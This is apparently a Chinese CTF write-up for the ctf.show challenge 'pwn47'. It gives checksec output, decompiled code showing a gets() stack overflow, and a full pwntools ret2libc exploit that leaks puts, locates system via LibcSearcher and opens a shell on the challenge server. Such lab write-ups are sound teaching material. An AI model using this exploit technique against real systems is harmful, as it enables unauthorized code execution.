```
tasike@tasike-VM:~/Desktop$ chmod 777 pwn47
```

```
tasike@tasike-VM:~/Desktop$ file pwn47
pwn47: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=aa562b794d4eec831a4037b9b03c15df7e738b90, not stripped
```

```
tasike@tasike-VM:~/Desktop$ checksec pwn47
[*] '/home/tasike/Desktop/pwn47'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```

`32bit`，堆栈不可执行

`ida`查看

```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdout, 0, 2, 0);
  logo(&argc);
  puts("Give you some useful addr:\n");
  printf("puts: %p\n", &puts);
  printf("fflush %p\n", &fflush);
  printf("read: %p\n", &read);
  printf("write: %p\n", &write);
  printf("gift: %p\n", useful);
  putchar(10);
  ctfshow();
  return 0;
}
```

跟进第10行`useful`会发现它其实就是指向`/bin/sh`的指针

```
.data:0804B028 2F 62 69 6E 2F 73 68 00       useful db '/bin/sh',0 
```

跟进`ctfshow`

```c
int ctfshow()
{
  char s[152]; // [esp+Ch] [ebp-9Ch] BYREF

  puts("Start your show time: ");
  gets(s);
  return puts(s);
}
```

> `s`与`ebp`距离`0x9C`

因此只有`system`没有

还是同样地，利用`ret2libc`



编写`attack47.py`

```python
from pwn import *
from LibcSearcher import *
context(os = 'Linux', arch = 'i386', log_level = 'debug')
r = remote('pwn.challenge.ctf.show', 28152)
elf = ELF('./pwn47')

binsh = 0x0804B028
main = elf.sym['main']
puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
payload = cyclic(0x9C + 0x4) + p32(puts_plt) + p32(main) + p32(puts_got)
r.sendline(payload)
puts = u32(r.recvuntil('\xf7')[-4:])
print(hex(puts))

libc = LibcSearcher('puts', puts)
libc_base = puts - libc.dump('puts')
system = libc_base + libc.dump('system')
payload = cyclic(0x9C + 0x4) + p32(system) + p32(0) + p32(binsh)
r.sendline(payload)
r.interactive()
```



